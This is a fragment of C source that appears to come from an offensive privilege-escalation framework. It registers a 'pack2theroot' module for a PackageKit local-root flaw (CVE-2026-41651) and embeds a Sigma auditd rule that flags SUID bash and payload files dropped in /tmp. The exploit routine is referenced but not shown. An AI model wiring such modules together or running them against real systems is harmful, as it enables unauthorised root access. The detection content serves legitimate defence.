	"  - https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv\n"
	"logsource: {product: linux, service: auditd}\n"
	"detection:\n"
	"  suid_drop:\n"
	"    type: 'PATH'\n"
	"    name|startswith: ['/tmp/.suid_bash', '/tmp/.pk-payload-', '/tmp/.pk-dummy-']\n"
	"  not_root:\n"
	"    auid|expression: '!= 0'\n"
	"  condition: suid_drop and not_root\n"
	"level: high\n"
	"tags:\n"
	"  - attack.privilege_escalation\n"
	"  - attack.t1068\n"
	"  - cve.2026.41651\n";

const struct skeletonkey_module pack2theroot_module = {
	.name           = "pack2theroot",
	.cve            = "CVE-2026-41651",
	.summary        = "PackageKit InstallFiles TOCTOU → root via .deb postinst",
	.family         = "pack2theroot",
	.kernel_range   = "userspace — PackageKit 1.0.2 ≤ V ≤ 1.3.4 (fixed in 1.3.5)",
	.detect         = p2tr_detect,
	.exploit        = p2tr_exploit,
	.mitigate       = NULL,
	.cleanup        = p2tr_cleanup,
	.detect_auditd  = p2tr_auditd,
	.detect_sigma   = p2tr_sigma,
	.detect_yara    = p2tr_yara,
	.detect_falco   = p2tr_falco,
};

void skeletonkey_register_pack2theroot(void)
{
	skeletonkey_register(&pack2theroot_module);
}
